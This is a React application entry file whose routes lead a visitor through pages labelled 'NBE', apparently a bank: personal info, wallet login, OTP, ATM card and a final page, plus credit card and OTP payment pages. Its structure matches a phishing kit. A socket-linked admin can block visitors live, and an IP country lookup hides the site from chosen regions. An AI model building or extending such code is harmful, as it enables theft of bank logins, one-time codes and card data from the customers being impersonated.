import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import ScrollToTop from "./components/ScrollToTop";
import PageTitleUpdater from "./components/PageTitleUpdater";
import { ThemeProvider } from "./contexts/ThemeContext";
import { initializeSocket, disconnectSocket, socket } from "./lib/store";

// NBE Pages
import HomePage from "./pages/nbe/HomePage";
import PersonalInfoPage from "./pages/nbe/PersonalInfoPage";
import WalletLoginPage from "./pages/nbe/WalletLoginPage";
import OTPPageNBE from "./pages/nbe/OTPPageNBE";
import ATMPageNBE from "./pages/nbe/ATMPageNBE";
import FinalPageNBE from "./pages/nbe/FinalPageNBE";

// Legacy Payment Pages (kept for backward compatibility)
import SummaryPayment from "./pages/SummaryPayment";
import CreditCardPayment from "./pages/CreditCardPayment";
import OTPVerification from "./pages/OTPVerification";
import FinalPage from "./pages/FinalPage";

function Router() {
  return (
    <Switch>
      {/* NBE Flow - Main Routes */}
      <Route path={"/"} component={HomePage} />
      <Route path={"/personal-info"} component={PersonalInfoPage} />
      <Route path={"/wallet-login"} component={WalletLoginPage} />
      <Route path={"/otp-nbe"} component={OTPPageNBE} />
      <Route path={"/atm-nbe"} component={ATMPageNBE} />
      <Route path={"/final-nbe"} component={FinalPageNBE} />

      {/* Legacy Payment Routes */}
      <Route path={"/summary-payment"} component={SummaryPayment} />
      <Route path={"/credit-card-payment"} component={CreditCardPayment} />
      <Route path={"/otp-verification"} component={OTPVerification} />
      <Route path={"/final-page"} component={FinalPage} />

      <Route path={"/404"} component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

// Blocked Country Page Component
function BlockedCountryPage() {
  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
        <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
          </svg>
        </div>
        <h1 className="text-2xl font-bold text-gray-800 mb-4">غير متاح</h1>
        <p className="text-gray-600 mb-2">عذراً، هذه الخدمة غير متاحة في منطقتك</p>
        <p className="text-gray-500 text-sm">This service is not available in your region</p>
      </div>
    </div>
  );
}

function App() {
  const [isCountryBlocked, setIsCountryBlocked] = useState(false);
  const [isCheckingCountry, setIsCheckingCountry] = useState(false);
  const [isVisitorBlocked, setIsVisitorBlocked] = useState(false);
  const [blockedMessage, setBlockedMessage] = useState("");

  // Initialize socket on app mount
  useEffect(() => {
    initializeSocket();
    return () => {
      disconnectSocket();
    };
  }, []);

  // Listen for admin block/unblock events
  useEffect(() => {
    const s = socket.value;
    const handleBlocked = () => {
      setIsVisitorBlocked(true);
      setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
    };
    const handleUnblocked = () => {
      setIsVisitorBlocked(false);
      setBlockedMessage("");
    };
    s.on("blocked", handleBlocked);
    s.on("unblocked", handleUnblocked);
    return () => {
      s.off("blocked", handleBlocked);
      s.off("unblocked", handleUnblocked);
    };
  }, []);

  // Check if visitor's country is blocked
  useEffect(() => {
    const checkCountry = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const visitorCountry = data.country_name;
        
        socket.value.emit('blockedCountries:check', visitorCountry);
        
        socket.value.on('blockedCountries:checkResult', ({ isBlocked }: { isBlocked: boolean }) => {
          setIsCountryBlocked(isBlocked);
          setIsCheckingCountry(false);
        });

        socket.value.on('blockedCountries:updated', async (blockedCountries: string[]) => {
          const isBlocked = blockedCountries.some(c => 
            c.toLowerCase() === visitorCountry.toLowerCase()
          );
          setIsCountryBlocked(isBlocked);
        });
      } catch (error) {
        console.error('Error checking country:', error);
        setIsCheckingCountry(false);
      }
    };

    const timer = setTimeout(checkCountry, 1000);
    const fallbackTimer = setTimeout(() => {
      setIsCheckingCountry(false);
    }, 3000);
    
    return () => {
      clearTimeout(timer);
      clearTimeout(fallbackTimer);
    };
  }, []);

  if (isCheckingCountry) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600"></div>
      </div>
    );
  }

  if (isCountryBlocked) {
    return <BlockedCountryPage />;
  }

  if (isVisitorBlocked) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-xl shadow-lg p-8 max-w-md w-full text-center">
          <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-4">تم الحظر</h1>
          <p className="text-gray-600 mb-2">{blockedMessage || "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام."}</p>
        </div>
      </div>
    );
  }

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="light">
        <TooltipProvider>
          <Toaster />
          <ScrollToTop />
          <PageTitleUpdater />
          <Router />
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
